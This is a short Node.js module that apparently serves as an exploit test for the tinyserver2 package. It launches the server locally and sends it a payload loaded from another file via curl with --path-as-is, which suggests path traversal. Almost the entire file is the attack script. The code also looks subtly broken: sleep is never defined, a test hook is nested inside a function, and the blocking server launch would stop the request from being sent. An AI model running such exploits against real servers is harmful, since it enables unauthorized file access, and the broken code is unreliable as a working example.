function exploitFunction() {
  const { execSync } = require("child_process");
  const path = require("path");

  // Stop the server on cleanup
  afterAll(() => {
    try {
      execSync("fuser -k 8976/tcp");
    } catch (e) {}
  });

  // Start the server
  execSync("node ./node_modules/tinyserver2/tinyserver.js -p 8976");

  // Sleep for 2 seconds to allow the server to start
  sleep.sleep(2);

  // Generate the payload
  const payload = require("./payload.js").getPayload();

  // Send the request to the server
  const attack_string = `curl -v --path-as-is "http://127.0.0.1:8976${payload}"`;
  const { exec } = require("child_process");
  exec(attack_string, (error, stdout) => {
    if (error) {
      throw error;
    }
    return stdout;
  });
}

module.exports = { exploitFunction };